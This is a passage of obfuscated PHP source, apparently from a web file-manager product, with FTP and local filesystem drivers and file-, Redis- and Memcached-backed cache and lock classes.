$this->iconvSystem($‹ø€’); $Ğ¸§íÕö = array($ºÙáÑ ø[32] => $this->iconvApp($‹ø€’), $ºÙáÑ ø[33] => $ºÙáÑ ø[210], $ºÙáÑ ø[86] => 0); @ftp_chdir($this->connect, $ºÙáÑ ø[8]); $¾Ğí¯Š° = @ftp_size($this->connect, $‹ø€’); if ($¾Ğí¯Š° != -1) { $Ğ¸§íÕö[$ºÙáÑ ø[86]] = $¾Ğí¯Š°; } else { $…ïşğ‡¯ = @ftp_chdir($this->connect, $‹ø€’); if (!$…ïşğ‡¯) { return !1; } $Ğ¸§íÕö[$ºÙáÑ ø[33]] = $ºÙáÑ ø[85]; } return $Ğ¸§íÕö; } protected function _isFolder($ƒæĞ¸Ğ¸) { $ŞïÆïíì =& $_SERVER[¹òÍ›æş]; if ($ƒæĞ¸Ğ¸ == $ŞïÆïíì[12] || $ƒæĞ¸Ğ¸ == $ŞïÆïíì[8]) { return !0; } $êÅÎÖ¾¹ = $this->_objectMeta($ƒæĞ¸Ğ¸); return isset($êÅÎÖ¾¹[$ŞïÆïíì[33]]) && $êÅÎÖ¾¹[$ŞïÆïíì[33]] == $ŞïÆïíì[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÉïûÒ³) { if (substr($ÉïûÒ³, 0, 2) == $_SERVER[¹òÍ›æş][1305]) { $ÉïûÒ³ = BASIC_PATH . substr($ÉïûÒ³, 2); } return $ÉïûÒ³; } public function iconvApp($Ô¹ğŒÔ½) { $İË’øÁğ =& $_SERVER[¹òÍ›æş]; global $config; return $this->iconvTo($Ô¹ğŒÔ½, $config[$İË’øÁğ[1380]], $config[$İË’øÁğ[1379]]); } public function iconvSystem($éü‚û“Ú) { $îôöÆ³« =& $_SERVER[¹òÍ›æş]; global $config; return $this->iconvTo($éü‚û“Ú, $config[$îôöÆ³«[1379]], $config[$îôöÆ³«[1380]]); } public function getPathOuter($¥ËÛ ‹) { $Ğö‚·ıã =& $_SERVER[¹òÍ›æş]; $ÄË˜æÇü = $this->iconvApp($this->pathBase); $¥ËÛ ‹ = $this->iconvApp($¥ËÛ ‹); if (substr($ÄË˜æÇü, 0, 2) == $Ğö‚·ıã[1305]) { $ÄË˜æÇü = BASIC_PATH . substr($ÄË˜æÇü, 2); } if (substr($¥ËÛ ‹, 0, 2) == $Ğö‚·ıã[1305]) { $¥ËÛ ‹ = BASIC_PATH . substr($¥ËÛ ‹, 2); } $ÄË˜æÇü = KodIO::clear($ÄË˜æÇü); $¥ËÛ ‹ = KodIO::clear($¥ËÛ ‹); $¥ËÛ ‹ = substr($¥ËÛ ‹, strlen($ÄË˜æÇü)); if (empty($this->pathDriver)) { return $¥ËÛ ‹; } return $this->pathDriver . $Ğö‚·ıã[8] . ltrim($¥ËÛ ‹, $Ğö‚·ıã[8]); } public function mkfile($İ›¤»£, $ÀüËÕú’ = '', $¿ß¶Óü = REPEAT_RENAME) { $İ›¤»£ = $this->iconvSystem($İ›¤»£); @touch($İ›¤»£); if ($ÀüËÕú’) { file_put_contents($İ›¤»£, $ÀüËÕú’); } @chmod($İ›¤»£, $this->pathAuth); return is_file($İ›¤»£) ? $this->getPathOuter($İ›¤»£) : !1; } public function mkdir($³àê¾Åİ, $‡›ƒ‰´à = REPEAT_SKIP) { $³àê¾Åİ = $this->iconvSystem($³àê¾Åİ); if (is_dir($³àê¾Åİ)) { return $this->getPathOuter($³àê¾Åİ); } @mkdir($³àê¾Åİ, $this->pathAuth, !0); @chmod($³àê¾Åİ, $this->pathAuth); return is_dir($³àê¾Åİ) ? $this->getPathOuter($³àê¾Åİ) : !1; } public function copyFile($¨óğß»½, $³İ÷ı¨ƒ) { $this->mkdir($this->pathFather($³İ÷ı¨ƒ)); $¨óğß»½ = $this->iconvSystem($¨óğß»½); $³İ÷ı¨ƒ = $this->iconvSystem($³İ÷ı¨ƒ); $¬„É†¢Ê = copy_64($¨óğß»½, $³İ÷ı¨ƒ); @chmod($³İ÷ı¨ƒ, $this->pathAuth); return $¬„É†¢Ê ? $this->getPathOuter($³İ÷ı¨ƒ) : !1; } public function moveFile($ŸôïÁ½, $ü«†¨Œ) { $this->mkdir($this->pathFather($ü«†¨Œ)); $ŸôïÁ½ = $this->iconvSystem($ŸôïÁ½); $ü«†¨Œ = $this->iconvSystem($ü«†¨Œ); $¬´ÒË† = intval(@rename($ŸôïÁ½, $ü«†¨Œ)); if (!$¬´ÒË†) { if ($¬´ÒË† = intval(@copy_64($ŸôïÁ½, $ü«†¨Œ))) { @unlink($ŸôïÁ½); } } @chmod($ü«†¨Œ, $this->pathAuth); return $¬´ÒË† ? $this->getPathOuter($ü«†¨Œ) : !1; } public function movePath($Éµ•ª²Î, $°œàĞÎ¸, $®³²Ê¹¤ = false) { $ğ ‹ò²Ğ =& $_SERVER[¹òÍ›æş]; $Éµ•ª²Î = $this->iconvSystem($Éµ•ª²Î); $°œàĞÎ¸ = $this->iconvSystem($°œàĞÎ¸); $ßÁÏ½äø = rtrim($°œàĞÎ¸, $ğ ‹ò²Ğ[8]) . $ğ ‹ò²Ğ[8] . ($®³²Ê¹¤ ? $®³²Ê¹¤ : get_path_this($Éµ•ª²Î)); if (file_exists($ßÁÏ½äø)) { return !1; } $–‹ğ›Æ = intval(@rename($Éµ•ª²Î, $ßÁÏ½äø)); $–‹ğ›Æ = file_exists($ßÁÏ½äø); return $–‹ğ›Æ ? $this->getPathOuter($ßÁÏ½äø) : !1; } public function delFile($·ûè”³ú) { $·ûè”³ú = $this->iconvSystem($·ûè”³ú); if (!@unlink($·ûè”³ú)) { @chmod($·ûè”³ú, $this->pathAuth); if (!@unlink($·ûè”³ú)) { return !1; } } else { return !0; } } public function delFolder($¦Üàäïâ) { $Ÿ§ ¥Íü =& $_SERVER[¹òÍ›æş]; $¦Üàäïâ = $this->iconvSystem($¦Üàäïâ); if (!is_dir($¦Üàäïâ)) { return !0; } if (!($Ç»¶¹±â = opendir($¦Üàäïâ))) { return !1; } while (($ğ£¼öŞü = readdir($Ç»¶¹±â)) !== !1) { if ($ğ£¼öŞü == $Ÿ§ ¥Íü[10] || $ğ£¼öŞü == $Ÿ§ ¥Íü[1306]) { continue; } $éØü¼½¨ = $¦Üàäïâ . $Ÿ§ ¥Íü[8] . $ğ£¼öŞü; if (is_file($éØü¼½¨) || is_link($éØü¼½¨)) { if (!unlink($éØü¼½¨)) { chmod($éØü¼½¨, $this->pathAuth); if (!unlink($éØü¼½¨)) { return !1; } } } else { if (is_dir($éØü¼½¨)) { chmod($éØü¼½¨, $this->pathAuth); $éØü¼½¨ = $this->iconvApp($éØü¼½¨); if (!$this->delFolder($éØü¼½¨)) { return !1; } } } } closedir($Ç»¶¹±â); return rmdir($¦Üàäïâ); } public function rename($ «æ«á», $Ù”¿ÇÒ) { $‹ôœÀ· =& $_SERVER[¹òÍ›æş]; $«É·º› = $this->fileNameAuto($this->pathFather($ «æ«á»), $Ù”¿ÇÒ); $«É·º› = $this->iconvSystem($«É·º›); $ «æ«á» = $this->iconvSystem($ «æ«á»); $®Áö‚× = $this->pathFather($ «æ«á»); $¨ÄÃ‘ = rtrim($®Áö‚×, $‹ôœÀ·[8]) . $‹ôœÀ·[8] . $«É·º›; $õ”ÌÇü = @rename($ «æ«á», $¨ÄÃ‘); $¨ÄÃ‘ = $this->iconvApp($¨ÄÃ‘); return $õ”ÌÇü ? $this->getPathOuter($¨ÄÃ‘) : !1; } public function size($¢¼ïãñä) { $¢¼ïãñä = $this->iconvSystem($¢¼ïãñä); return filesize_64($¢¼ïãñä); } public function info($üš°›) { $üš°› = $this->iconvSystem($üš°›); if ($this->isFolder($üš°›)) { return $this->folderInfo($üš°›); } else { if ($this->isFile($üš°›)) { return $this->fileInfo($üš°›); } } return !1; } protected function infoChildren($Ğ‰†ãà, &$è•©æ–¨, $Í«ÇÎØ = true) { $Ò¾“˜±à =& $_SERVER[¹òÍ›æş]; check_abort_echo(); $Ğ‰†ãà = rtrim($Ğ‰†ãà, $Ò¾“˜±à[8]) . $Ò¾“˜±à[8]; if ($Í«ÇÎØ) { $Ğ‰†ãà = $this->iconvSystem($Ğ‰†ãà); } if (!($¦ÏÇã¾ = @opendir($Ğ‰†ãà))) { return; } while (($¡¸¤­ûá = readdir($¦ÏÇã¾)) !== !1) { if ($¡¸¤­ûá == $Ò¾“˜±à[10] || $¡¸¤­ûá == $Ò¾“˜±à[1306]) { continue; } $ÔÏÙ–ˆ… = $Ğ‰†ãà . $¡¸¤­ûá; if (is_file($ÔÏÙ–ˆ…) || is_link($ÔÏÙ–ˆ…)) { $è•©æ–¨[$Ò¾“˜±à[87]]++; $è•©æ–¨[$Ò¾“˜±à[86]] += filesize_64($ÔÏÙ–ˆ…); } else { if (is_dir($ÔÏÙ–ˆ…)) { $è•©æ–¨[$Ò¾“˜±à[88]]++; $this->infoChildren($ÔÏÙ–ˆ…, $è•©æ–¨, !1); } } } closedir($¦ÏÇã¾); } private function folderInfo($˜…İ©, $ƒ›’á®ˆ = false) { $‘Íñ¿´Ü =& $_SERVER[¹òÍ›æş]; $˜…İ© = rtrim($˜…İ©, $‘Íñ¿´Ü[8]) . $‘Íñ¿´Ü[8]; $¸ğ¥šÊ± = $this->iconvApp($this->pathThis($˜…İ©)); if ($ƒ›’á®ˆ) { return array($‘Íñ¿´Ü[32] => $¸ğ¥šÊ±, $‘Íñ¿´Ü[94] => $this->getPathOuter($˜…İ©), $‘Íñ¿´Ü[33] => $‘Íñ¿´Ü[85]); } $–œ®Òúí = array($‘Íñ¿´Ü[32] => $¸ğ¥šÊ±, $‘Íñ¿´Ü[94] => $this->getPathOuter($˜…İ©), $‘Íñ¿´Ü[33] => $‘Íñ¿´Ü[85], $‘Íñ¿´Ü[211] => @filectime($˜…İ©), $‘Íñ¿´Ü[95] => @filemtime($˜…İ©), $‘Íñ¿´Ü[1390] => @fileatime($˜…İ©), $‘Íñ¿´Ü[1391] => is_readable($˜…İ©), $‘Íñ¿´Ü[1392] => is_writable($˜…İ©), $‘Íñ¿´Ü[1393] => get_mode($˜…İ©)); return $–œ®Òúí; } private function fileInfo($§±Ã–Ş, $éòã£œ = false) { $ŸóÇß¢ =& $_SERVER[¹òÍ›æş]; $Ö‡Ç¹õ¦ = $this->iconvApp($this->pathThis($§±Ã–Ş)); if ($éòã£œ) { return array($ŸóÇß¢[32] => $Ö‡Ç¹õ¦, $ŸóÇß¢[94] => $this->getPathOuter($§±Ã–Ş), $ŸóÇß¢[33] => $ŸóÇß¢[210], $ŸóÇß¢[86] => $this->size($§±Ã–Ş), $ŸóÇß¢[184] => $this->ext($Ö‡Ç¹õ¦)); } $„‘ÉŠû£ = array($ŸóÇß¢[32] => $Ö‡Ç¹õ¦, $ŸóÇß¢[94] => $this->getPathOuter($§±Ã–Ş), $ŸóÇß¢[33] => $ŸóÇß¢[210], $ŸóÇß¢[211] => @filectime($§±Ã–Ş), $ŸóÇß¢[95] => @filemtime($§±Ã–Ş), $ŸóÇß¢[1390] => @fileatime($§±Ã–Ş), $ŸóÇß¢[86] => $this->size($§±Ã–Ş), $ŸóÇß¢[184] => $this->ext($Ö‡Ç¹õ¦), $ŸóÇß¢[1391] => is_readable($§±Ã–Ş), $ŸóÇß¢[1392] => is_writable($§±Ã–Ş), $ŸóÇß¢[1393] => get_mode($§±Ã–Ş)); return $„‘ÉŠû£; } public function exist($ºëÒà¬) { $ºëÒà¬ = $this->iconvSystem($ºëÒà¬); return @file_exists($ºëÒà¬); } public function isFile($ÊİÓûü) { $ÊİÓûü = $this->iconvSystem($ÊİÓûü); return @is_file($ÊİÓûü); } public function isFolder($ß¸¡ÑûÙ) { $ß¸¡ÑûÙ = $this->iconvSystem($ß¸¡ÑûÙ); return @is_dir($ß¸¡ÑûÙ); } public function listPath($ĞÄ†ºĞƒ, $ïü´úß÷ = false) { $›áêï” =& $_SERVER[¹òÍ›æş]; $ĞÄ†ºĞƒ = $this->iconvSystem($ĞÄ†ºĞƒ); $ĞÄ†ºĞƒ = rtrim($ĞÄ†ºĞƒ, $›áêï”[8]) . $›áêï”[8]; $›²šÅ®æ = array($›áêï”[92] => array(), $›áêï”[93] => array()); if (!($öçƒÌÁ¨ = @opendir($ĞÄ†ºĞƒ))) { return $›²šÅ®æ; } while (($ÌûÒÏõ¾ = readdir($öçƒÌÁ¨)) !== !1) { if ($ÌûÒÏõ¾ == $›áêï”[10] || $ÌûÒÏõ¾ == $›áêï”[1306]) { continue; } $ÅÊªÕ´ƒ = $ĞÄ†ºĞƒ . $ÌûÒÏõ¾; if (is_file($ÅÊªÕ´ƒ)) { $›²šÅ®æ[$›áêï”[93]][] = $this->fileInfo($ÅÊªÕ´ƒ, $ïü´úß÷); } else { $›²šÅ®æ[$›áêï”[92]][] = $this->folderInfo($ÅÊªÕ´ƒ, $ïü´úß÷); } } closedir($öçƒÌÁ¨); return $›²šÅ®æ; } public function listAll($õñù°®, &$¯ã²ï†ß = array()) { $İéüàôÌ =& $_SERVER[¹òÍ›æş]; $õñù°® = $this->iconvSystem($õñù°®); $õñù°® = rtrim($õñù°®, $İéüàôÌ[8]) . $İéüàôÌ[8]; if (!($İÇŞÇ = @opendir($õñù°®))) { return $¯ã²ï†ß; } while (($–ëµÆâÛ = readdir($İÇŞÇ)) !== !1) { if ($–ëµÆâÛ == $İéüàôÌ[10] || $–ëµÆâÛ == $İéüàôÌ[1306]) { continue; } $¯ÓÙ¥Ç­ = $õñù°® . $–ëµÆâÛ; $¯Âüß»× = is_dir($¯ÓÙ¥Ç­) && !is_link($¯ÓÙ¥Ç­) ? 1 : 0; $¯ÓÙ¥Ç­ = $¯Âüß»× ? $¯ÓÙ¥Ç­ . $İéüàôÌ[8] : $¯ÓÙ¥Ç­; $¯ã²ï†ß[] = array($İéüàôÌ[94] => $¯ÓÙ¥Ç­, $İéüàôÌ[85] => $¯Âüß»×, $İéüàôÌ[95] => intval(@filemtime($¯ÓÙ¥Ç­)), $İéüàôÌ[86] => $¯Âüß»× ? 0 : intval($this->size($¯ÓÙ¥Ç­))); if ($¯Âüß»×) { $this->listAll($¯ÓÙ¥Ç­, $¯ã²ï†ß); } } closedir($İÇŞÇ); return $¯ã²ï†ß; } public function has($èüøş•Î, $Ÿª¬×û = false, $æ÷Š¨‡­ = true) { $¼‹µé–õ =& $_SERVER[¹òÍ›æş]; $èüøş•Î = $this->iconvSystem($èüøş•Î); $èüøş•Î = rtrim($èüøş•Î, $¼‹µé–õ[8]) . $¼‹µé–õ[8]; if (!($Œ´ËŒ­½ = @opendir($èüøş•Î))) { return !1; } $Â—É‡· = 0; $µõúã = 0; $µ„›÷»Ş = 0; while (($¬ŒÉÛŠ = readdir($Œ´ËŒ­½)) !== !1) { if ($¬ŒÉÛŠ == $¼‹µé–õ[10] || $¬ŒÉÛŠ == $¼‹µé–õ[1306]) { continue; } $ÂÖ¶ƒü = $èüøş•Î . $¬ŒÉÛŠ; if ($Ÿª¬×û) { $µ„›÷»Ş++; if (@is_file($ÂÖ¶ƒü)) { $Â—É‡·++; } else { $µõúã++; } if ($µ„›÷»Ş > 10000) { break; } continue; } if ($æ÷Š¨‡­) { if (@is_file($ÂÖ¶ƒü)) { return !0; } } else { if (@is_dir($ÂÖ¶ƒü . $¼‹µé–õ[8])) { return !0; } } } closedir($Œ´ËŒ­½); if ($Ÿª¬×û) { return array($¼‹µé–õ[217] => $Â—É‡·, $¼‹µé–õ[218] => $µõúã); } return !1; } public function hashSimple($ÀĞÒîÌÇ) { $Â”›ãøß =& $_SERVER[¹òÍ›æş]; if (!$ÀĞÒîÌÇ) { return md5($Â”›ãøß[12]); } $ÀĞÒîÌÇ = $this->iconvSystem($ÀĞÒîÌÇ); $ê§ïÏÒ¥ = $this->size($ÀĞÒîÌÇ); $‡è¯ËÁ† = 200; $³’Ö½¨£ = 50; if ($ê§ïÏÒ¥ <= $‡è¯ËÁ† * $³’Ö½¨£) { return $this->hashMd5($ÀĞÒîÌÇ) . $ê§ïÏÒ¥; } $Îø•ÚÃ = $Â”›ãøß[12]; $‚é·›³ò = intval($ê§ïÏÒ¥ / $³’Ö½¨£); $âç£Ç£‹ = fopen($ÀĞÒîÌÇ, $Â”›ãøß[1394]); if (!$âç£Ç£‹) { return $Îø•ÚÃ; } for ($»ÎíÚÌ× = 0; $»ÎíÚÌ× < $³’Ö½¨£; $»ÎíÚÌ×++) { fseek_64($âç£Ç£‹, $‚é·›³ò * $»ÎíÚÌ×); $Îø•ÚÃ .= fread($âç£Ç£‹, $‡è¯ËÁ†); } fseek_64($âç£Ç£‹, $ê§ïÏÒ¥ - $‡è¯ËÁ†); $Îø•ÚÃ .= fread($âç£Ç£‹, $‡è¯ËÁ†); fclose($âç£Ç£‹); return md5($Îø•ÚÃ) . $ê§ïÏÒ¥; } public function getContent($ÃÏ¡Øï) { $ÃÏ¡Øï = $this->iconvSystem($ÃÏ¡Øï); return file_get_contents($ÃÏ¡Øï); } public function setContent($…ÈüÃàÄ, $®óßØ¶½ = '') { $…ÈüÃàÄ = $this->iconvSystem($…ÈüÃàÄ); $ßÇêıõŒ = @file_put_contents($…ÈüÃàÄ, $®óßØ¶½, LOCK_EX); clearstatcache(); @chmod($…ÈüÃàÄ, $this->pathAuth); return $ßÇêıõŒ === !1 ? !1 : !0; } public function fileSubstr($û¹ßÚƒ«, $±À¢¬ = 0, $ı»™™¦— = false) { $—ÎÒÍï =& $_SERVER[¹òÍ›æş]; $û¹ßÚƒ« = $this->iconvSystem($û¹ßÚƒ«); if ($ı»™™¦— === !1) { $ı»™™¦— = $this->size($û¹ßÚƒ«); } if ($ı»™™¦— <= 0) { return $—ÎÒÍï[12]; } $âÖ·²À« = fopen($û¹ßÚƒ«, $—ÎÒÍï[1394]); if (!$âÖ·²À«) { return !1; } fseek_64($âÖ·²À«, $±À¢¬); $™—·äÚï = fread($âÖ·²À«, $ı»™™¦—); fclose($âÖ·²À«); return $™—·äÚï; } public function upload($ö‘Óˆ, $¾¸Û„¶½, $‰¥–Û¿ = false, $óÀñËë¸ = REPEAT_REPLACE) { if ($‰¥–Û¿) { return $this->moveFile($¾¸Û„¶½, $ö‘Óˆ); } return $this->copyFile($¾¸Û„¶½, $ö‘Óˆ); } public function setModifyTime($‡•ûîóì, $ŒÂò¿‰Ù = '') { @touch($‡•ûîóì, intval($ŒÂò¿‰Ù)); } public function download($è©À¡, $·‹®ßşÜ) { return $this->iconvSystem($è©À¡); } } goto FÊ¸Ç´ÌóÁ; b©§ŠÄßë: define($_SERVER[¹òÍ›æş][278], 3); define($_SERVER[¹òÍ›æş][279], 1); define($_SERVER[¹òÍ›æş][280], 0); goto bóéªõâŸä; Dß©§ÓÅÂ†: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ªù±–‡ =& $_SERVER[¹òÍ›æş]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $“‘“Äò = $GLOBALS[$ªù±–‡[6]][$ªù±–‡[387]]; $˜‡ï×Íî = $“‘“Äò[$“‘“Äò[$ªù±–‡[857]]]; $×ôˆ±¾ = $“‘“Äò[$ªù±–‡[858]]; switch ($“‘“Äò[$ªù±–‡[857]]) { case $ªù±–‡[21]: self::$handle = Model($ªù±–‡[859]); break; case $ªù±–‡[860]: self::$handle = new CacheRedis($˜‡ï×Íî, $×ôˆ±¾); break; case $ªù±–‡[861]: self::$handle = new CacheMemcached($˜‡ï×Íî, $×ôˆ±¾); break; case $ªù±–‡[210]: self::$handle = new CacheFile($˜‡ï×Íî, $×ôˆ±¾); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¬Á´—Şë) { if (is_array($¬Á´—Şë) || is_object($¬Á´—Şë)) { $¬Á´—Şë = json_encode($¬Á´—Şë); } $¬Á´—Şë = rawurlencode($¬Á´—Şë); return md5(KOD_SITE_ID . $_SERVER[¹òÍ›æş][11] . $¬Á´—Şë); } public static function get($µÉ±ÏÖã, $³™œáá = false) { $¦·ÖŸî = self::key($µÉ±ÏÖã); if ($³™œáá) { return unserialize(self::init()->get($¦·ÖŸî)); } if (!isset(self::$memoryCache[$¦·ÖŸî])) { $‡±¹¶¹â = self::init()->get($¦·ÖŸî); self::$memoryCache[$¦·ÖŸî] = unserialize($‡±¹¶¹â); } return self::$memoryCache[$¦·ÖŸî]; } public static function set($æß„¤µ, $ƒ÷ÁÚáç, $ÏÔû„†Î = false) { $Ç˜À³İ = self::key($æß„¤µ); if (isset(self::$memoryCache[$Ç˜À³İ]) && self::$memoryCache[$Ç˜À³İ] === $ƒ÷ÁÚáç) { return !0; } if ($ÏÔû„†Î === 0) { self::$memoryCache[$Ç˜À³İ] = $ƒ÷ÁÚáç; return !0; } CacheLock::lock($æß„¤µ); $«ÛÀâÕ‹ = self::init()->set($Ç˜À³İ, serialize($ƒ÷ÁÚáç), $ÏÔû„†Î); self::$memoryCache[$Ç˜À³İ] = $ƒ÷ÁÚáç; CacheLock::unlock($æß„¤µ); return $«ÛÀâÕ‹; } public static function getCall($Ş¼ñ¸¡Ø, $Œüñ…¨­, $­É€ó°½, $âú×Š› = array()) { $ƒÒ»ø„ =& $_SERVER[¹òÍ›æş]; $×ÀéıÍ = self::get($Ş¼ñ¸¡Ø); if ($×ÀéıÍ || $×ÀéıÍ === $ƒÒ»ø„[12]) { return $×ÀéıÍ; } $×ÀéıÍ = call_user_func_array($­É€ó°½, $âú×Š›); $×ÀéıÍ = $×ÀéıÍ ? $×ÀéıÍ : $ƒÒ»ø„[12]; self::set($Ş¼ñ¸¡Ø, $×ÀéıÍ, $Œüñ…¨­); return $×ÀéıÍ; } public static function remove($Ê¾÷€ğÚ) { $’¡Ñü˜ò = self::key($Ê¾÷€ğÚ); unset(self::$memoryCache[$’¡Ñü˜ò]); self::clearTimeout(); CacheLock::lock($Ê¾÷€ğÚ); $µÂ¦ÄÇ = self::init()->remove($’¡Ñü˜ò); CacheLock::unlock($Ê¾÷€ğÚ); return $µÂ¦ÄÇ; } public static function removeMemory($ô¨Íã¡) { $íÓéÑå¥ = self::key($ô¨Íã¡); unset(self::$memoryCache[$íÓéÑå¥]); } public static function clearMemory($îÄ­îï = false) { if ($îÄ­îï) { $îÄ­îï = self::key($îÄ­îï); unset(self::$memoryCache[$îÄ­îï]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹òÍ›æş][862])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹òÍ›æş][863])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ñ™ÙòÑ›, $ÍÌ·Êµ¡) { $ŠÜ±¼ìÛ =& $_SERVER[¹òÍ›æş]; $this->cachePath = $Ñ™ÙòÑ›[$ŠÜ±¼ìÛ[94]]; $this->prefix = $ŠÜ±¼ìÛ[864]; $this->cacheTime = $ÍÌ·Êµ¡; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($âÚî¶Û) { $‰×–è =& $_SERVER[¹òÍ›æş]; $âÚî¶Û = str_replace(array($‰×–è[865], $‰×–è[107], $‰×–è[83]), $‰×–è[866], $âÚî¶Û); return $this->cachePath . $‰×–è[867] . $âÚî¶Û . $‰×–è[868]; } public function set($åÒŞå, $†ºÇ«ûñ, $ªç‹ÆâÆ = false) { $ªç‹ÆâÆ = $ªç‹ÆâÆ ? $ªç‹ÆâÆ : $this->cacheTime; $±ÛãôæÑ = $this->getFile($åÒŞå); if (file_put_contents($±ÛãôæÑ, $this->prefix . $†ºÇ«ûñ, LOCK_EX)) { @touch($±ÛãôæÑ, intval(time() + $ªç‹ÆâÆ)); clearstatcache(); return !0; } @unlink($±ÛãôæÑ); return !1; } public function get($–®¬íÖê) { $şâÉŸ±Ñ = $this->getFile($–®¬íÖê); if (file_exists($şâÉŸ±Ñ) && filemtime($şâÉŸ±Ñ) < time()) { @unlink($şâÉŸ±Ñ); return !1; } $Ùò§½Å = @file_get_contents($şâÉŸ±Ñ); return substr($Ùò§½Å, strlen($this->prefix)); } public function remove($æµ©Äİº) { $ú´ŠÜşÒ = $this->getFile($æµ©Äİº); return @unlink($ú´ŠÜşÒ); } public function deleteAll() { $ŞòÎıéİ =& $_SERVER[¹òÍ›æş]; $áöàÁ’º = scandir($this->cachePath); foreach ($áöàÁ’º as $¤Ş†ÂÓÌ) { $Ã™«Ä÷§ = $this->cachePath . $¤Ş†ÂÓÌ; if (strpos($Ã™«Ä÷§, $ŞòÎıéİ[868]) && strpos($Ã™«Ä÷§, $ŞòÎıéİ[869])) { @unlink($Ã™«Ä÷§); } } } public function clearTimeout() { $Õâˆ€ïÙ =& $_SERVER[¹òÍ›æş]; $Ÿ§ÎÑ = scandir($this->cachePath); foreach ($Ÿ§ÎÑ as $¥éæãØÖ) { $‘ëïû‚Ñ = $this->cachePath . $¥éæãØÖ; if (strpos($‘ëïû‚Ñ, $Õâˆ€ïÙ[868]) && strpos($‘ëïû‚Ñ, $Õâˆ€ïÙ[869]) && filemtime($‘ëïû‚Ñ) < time()) { @unlink($‘ëïû‚Ñ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $–± çóâ =& $_SERVER[¹òÍ›æş]; if (self::$handle) { return self::$handle; } $ÛŠÑìŠ€ = $GLOBALS[$–± çóâ[6]][$–± çóâ[387]]; self::$timeout = $ÛŠÑìŠ€[$–± çóâ[870]] ? $ÛŠÑìŠ€[$–± çóâ[870]] : 10; $ÀµÔ¾« = _get($GLOBALS[$–± çóâ[6]], $–± çóâ[871]); $ áœƒÛù = $ÛŠÑìŠ€[$–± çóâ[857]] ? $ÛŠÑìŠ€[$–± çóâ[857]] : $–± çóâ[210]; if ($ áœƒÛù == $–± çóâ[21] && $ÀµÔ¾« == $–± çóâ[13]) { $ áœƒÛù = $–± çóâ[210]; } switch ($ áœƒÛù) { case $–± çóâ[860]: self::$handle = new CacheLockRedis(); break; case $–± çóâ[861]: self::$handle = new CacheLockMemcached(); break; case $–± çóâ[21]: self::$handle = new CacheLockDatabase(); break; case $–± çóâ[210]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($–± çóâ[872], $–± çóâ[873]); } return self::$handle; } private static function key($ÈóŒ¦ü) { return $_SERVER[¹òÍ›æş][874] . Cache::key($ÈóŒ¦ü); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($‰ç¢¼´Æ = '') { self::$errorMsg = $‰ç¢¼´Æ; } public static function lockGlobal($¦ƒ€ÃÚ, $ËªëÇç) { return self::lock($¦ƒ€ÃÚ, $ËªëÇç, !0); } public static function lock($¬±Ù“’Ë, $»£¸‘İ  = false, $ÜïÆŒ = false) { $£‹§Ú†ê =& $_SERVER[¹òÍ›æş]; $ŒáÖËĞÚ = self::init(); $ÆÕ†áÌû = self::key($¬±Ù“’Ë); $»£¸‘İ  = $»£¸‘İ  ? $»£¸‘İ  : self::$timeout; $ú„µ¡¹¤ = timeFloat(); $¯›ÅûÎı = $ŒáÖËĞÚ->lock($ÆÕ†áÌû, $»£¸‘İ ); $¨õ”ªĞš = timeFloat(); if (!$¯›ÅûÎı) { $ŠÂåéÓĞ = "\154\x6f\x63\x6b\40\x65\x72\x72\x6f\x72\x3b\153\x65\x79\x3d{$¬±Ù“’Ë}\x3b\164\151\155\145\x3d{$»£¸‘İ }\x3b" . self::$errorMsg . $£‹§Ú†ê[81] . get_caller_msg(); $œ ó˜© = LNG($£‹§Ú†ê[875]) . "\x28{$»£¸‘İ }\x73\51\56" . LNG($£‹§Ú†ê[876]); $œ ó˜© .= $£‹§Ú†ê[877]; if (is_string(self::$errorMsg) && self::$errorMsg) { $œ ó˜© = $œ ó˜© . $£‹§Ú†ê[878] . self::$errorMsg; } write_log($£‹§Ú†ê[879] . sprintf($£‹§Ú†ê[880], timeFloat() - $ú„µ¡¹¤) . $£‹§Ú†ê[881] . $ŠÂåéÓĞ . $£‹§Ú†ê[882] . error_get_last(), $£‹§Ú†ê[873]); show_json($œ ó˜©, !1); } if (!$ÜïÆŒ) { self::$lockItem[$ÆÕ†áÌû] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $óÚí†Üß = number_format(timeFloat() - $¨õ”ªĞš, 3); write_log($£‹§Ú†ê[883] . $¬±Ù“’Ë . $£‹§Ú†ê[884] . $óÚí†Üß, $£‹§Ú†ê[873]); } return $¯›ÅûÎı; } public static function lockGet($³³ÙıÇ¡) { $¥Çæú† = self::key($³³ÙıÇ¡); if (self::$lockItem[$¥Çæú†]) { return self::$lockItem[$¥Çæú†]; } return self::init()->lockGet($¥Çæú†); } public static function unlock($ú÷äŒÆ™) { $Î‚·¿ğÃ =& $_SERVER[¹òÍ›æş]; $ñ‘´Ş¤ƒ = self::key($ú÷äŒÆ™); self::$lockItem[$ñ‘´Ş¤ƒ] = null; self::init()->unlock($ñ‘´Ş¤ƒ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Î‚·¿ğÃ[885] . $ú÷äŒÆ™, $Î‚·¿ğÃ[873]); } return; } public static function unlockRuntime() { $¥±Ë¯à£ =& $_SERVER[¹òÍ›æş]; $â£ñà = self::init(); $›Óšş£‘ = !1; foreach (self::$lockItem as $ş”ÂÊŞÁ => $Ì¥Èó“²) { if (!$Ì¥Èó“²) { continue; } $â£ñà->unlock($ş”ÂÊŞÁ); if (!$›Óšş£‘) { $›Óšş£‘ = !0; write_log($¥±Ë¯à£[886] . $ş”ÂÊŞÁ . 